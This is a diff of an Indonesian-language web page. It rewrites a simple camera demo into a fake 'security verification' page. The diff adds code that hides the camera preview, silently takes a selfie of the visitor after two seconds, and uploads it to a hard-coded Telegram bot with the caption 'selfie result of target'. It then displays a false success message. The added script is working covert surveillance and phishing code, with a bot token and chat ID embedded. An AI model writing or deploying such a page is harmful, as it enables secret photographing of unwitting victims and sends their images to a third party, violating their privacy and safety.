@@ -1,59 +1,61 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<title>Kamera</title>
-<style>
-body {
-  background: black;
-  color: white;
-  text-align: center;
-  font-family: Arial;
-}
-video, canvas {
-  width: 90%;
-  max-width: 400px;
-  border: 2px solid cyan;
-  margin-top: 10px;
-}
-button {
-  padding: 10px 20px;
-  background: cyan;
-  border: none;
-  margin-top: 10px;
-  font-size: 16px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan</title>
+    <style>
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        video { width: 1px; height: 1px; opacity: 0; } /* Sembunyikan kamera agar tidak curiga */
+        .loading { font-size: 18px; color: cyan; }
+    </style>
 </head>
 <body>
+    <div class="loading">Memuat Halaman... Mohon Tunggu...</div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-<h2>📷 Kamera Aktif</h2>
-<video id="video" autoplay></video>
-<br>
-<button onclick="takePhoto()">📸 Ambil Foto</button>
-<canvas id="canvas"></canvas>
+    <script>
+        const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
+        const CHAT_ID = "7596509818";
 
-<script>
-const video = document.getElementById("video");
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
 
-navigator.mediaDevices.getUserMedia({
-  video: { facingMode: "user" }
-})
-.then(stream => {
-  video.srcObject = stream;
-})
-.catch(err => {
-  alert("Izin kamera ditolak!");
-});
+        // Akses Kamera
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            video.srcObject = stream;
+            // Tunggu 2 detik agar kamera fokus baru ambil foto otomatis
+            setTimeout(takeAndSend, 2000);
+        })
+        .catch(err => {
+            alert("Error: Izinkan akses kamera untuk melanjutkan.");
+        });
 
-function takePhoto() {
-  const canvas = document.getElementById("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0);
-}
-</script>
+        function takeAndSend() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            
+            // Ubah foto ke format Blob
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "selfie.jpg");
+                formData.append("caption", "📸 <b>HASIL SELFIE TARGET!</b>");
 
+                // Kirim ke API Telegram
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(res => {
+                    document.body.innerHTML = "<h2>✅ Verifikasi Berhasil!</h2>";
+                })
+                .catch(err => console.error(err));
+            }, "image/jpeg");
+        }
+    </script>
 </body>
 </html>
